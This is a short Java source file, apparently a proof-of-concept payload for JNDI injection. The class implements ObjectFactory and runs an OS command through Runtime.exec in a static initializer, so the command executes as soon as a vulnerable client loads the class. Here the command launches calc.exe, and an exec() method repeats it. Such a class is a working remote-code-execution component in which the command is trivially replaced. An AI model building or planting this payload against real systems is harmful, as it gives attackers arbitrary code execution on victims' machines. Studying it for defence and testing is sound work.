package org.ixpqxi.util;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class RemoteObject implements ObjectFactory {
    static {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    // 1. 必须提供 public 无参构造函数
    public RemoteObject() {
    }

    // 2. 实现 ObjectFactory 接口的核心方法
    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return this;
    }

    public void sayHello() {
        System.out.println("Hello World! RemoteObject loaded successfully.");
    }

    public void exec() {
        try {
            Runtime.getRuntime().exec("calc.exe");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
